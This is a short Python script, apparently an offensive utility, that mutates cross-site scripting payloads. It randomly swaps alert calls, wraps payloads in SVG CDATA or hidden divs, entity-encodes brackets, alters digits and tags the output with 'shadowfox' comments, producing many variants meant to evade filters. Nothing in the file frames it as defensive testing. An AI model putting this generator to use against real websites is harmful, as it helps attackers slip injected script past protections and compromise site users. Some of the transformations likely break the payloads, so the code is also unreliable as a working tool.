import random

def alchemize_xss(base):
    layers = [
        lambda p: p.replace("alert", random.choice(["prompt", "confirm"])),
        lambda p: f"<svg><desc><![CDATA[{p}]]></desc></svg>",
        lambda p: p.replace("<", "&#x3C;").replace(">", "&#x3E;"),
        lambda p: p.replace("1", str(random.randint(2, 9))),
        lambda p: f"<div style='display:none'>{p}</div>",
        lambda p: f"<!--shadowfox-->{p}<!--/shadowfox-->",
    ]
    for i in range(random.randint(2, 4)):
        base = random.choice(layers)(base)
    return base

def transmute_payloads(base_list, count=5):
    result = set()
    for base in base_list:
        for _ in range(count):
            result.add(alchemize_xss(base))
    return list(result)
